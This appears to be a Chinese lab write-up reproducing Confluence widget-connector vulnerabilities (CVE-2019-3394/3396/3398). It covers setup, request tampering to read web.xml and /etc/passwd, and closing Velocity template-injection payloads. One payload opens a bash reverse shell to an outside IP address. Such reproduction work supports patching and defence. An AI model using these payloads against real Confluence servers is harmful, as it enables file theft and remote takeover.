## 1.漏洞描述

Confluence是款企业知识库软件。

其中Confluence Server和Data Center产品中使用的小工具连接器widgetconnecter组件（版本<=3.1.3）中存在任意文件读取，命令执行等。

## 2.漏洞编号

CVE-2019-3394

CVE-2019-3396

CVE-2019-3398

## 3.影响版本

2.0.0 <= version < 6.6.13

6.7.0 <= version < 6.12.4

6.13.0 <= version < 6.13.4

6.14.0 <= version < 6.14.3

6.15.0 <= version < 6.15.2

## 4. 环境搭建

confluence版本6.3.4

mysql版本5.7

首先使用docker搭建mysql

```
docker pull mysql:5.7
```

![](../Images/30ac8cb3dffc6414e1eb3364282671b2.png)

```

```

![](../Images/df73b41596d315375e55d8c1249966a3.png)

```

docker run --name mysql5.7 -p 3306:3306 -e MYSQL\_ROOT\_PASSWORD=123456 -d mysql:5.7
```

![](../Images/02da5b563e96736a6c73cab056602015.png)

查看mysql是否运行

```

sudo netstat -tap | grep mysql
```

![](../Images/8b3e1bb4300bce4d1d79c05120f30dc5.png)

数据库已正常运行，使用工具连接，创建confluence数据库

![](../Images/8b8f23191708f5dec3abe711e0dfba58.png)

安装配置完数据库开始安装confluence6.3.4

```

wget https://www.atlassian.com/software/confluence/downloads/binary/atlassian-confluence-6.3.4-x64.bin
```

![](../Images/114dff44f9c762df0de4e30634a202b0.png)

对atlassian-confluence-6.3.4-x64.bin文件进行赋权

```

chmod +x atlassian-confluence-6.3.4-x64.bin
```

执行

```

./atlassian-confluence-6.3.4-x64.bin
```

根据提示依次选择o 1 i

![](../Images/89f9947aeccb33f1ec26166ce4da08e8.png)

![](../Images/768a1337fc41a52e1dfe427600402668.png)

![](../Images/bcced2205cd644771bfd3168d12992e7.png)

## 5.漏洞复现

### 5.3.CVE-2019-3394

在文本编辑处插入图片，如图

![](../Images/4ac9720abc41a606dec2cbfa817ec4ce.png)

插入后，点击发布更新，拦截数据包修改上传连接，将此部分去掉

 ![](../Images/3f4752617257a074798496302ee4f9a5.png)![](../Images/b115eb6a085f0ee4aa7699406efe5471.png)

  

看到图片已上传，使用导出word功能，可读取web.xml文档

![](../Images/7b3627e9348242bd957df0423db8a27f.png)

![](../Images/b2ae53e7feb086bde711f5e3be4ae454.png)

### 5.2.CVE-2019-3396

点击创建选择其他宏，小工具连接器组件，输入上传地址，点击预览。

![](../Images/86137ef02742c00538276c320d5ee24d.png)![](../Images/c4767b2bb29bd29308a5a079744051b4.png)![](../Images/9ce4eaa413ca9db48551edda9849e9f4.png) 

抓取数据包，可以发现这个位置没有`_template`参数，可能这里是通过白盒代码审计发现的漏洞

![](../Images/00339b94d5e74a976e7225ad97e52cbf.png)

把`_template`参数添加上进行执行任意文件读取

![](../Images/ab3211bf4738dbc1e44c55b563e3731e.png)

读取/etc/passwd

![](../Images/cc21ae1a7bb36573b1d9933ae305ce08.png)

命令执行语法

执行计算机

`#set($e="e") $e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("/usr/bin/gnome-calculator")`

 nc反弹shell

`#set($e="e") $e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("bash -i >& /dev/tcp/149.129.68.79/56888 0>&1")`
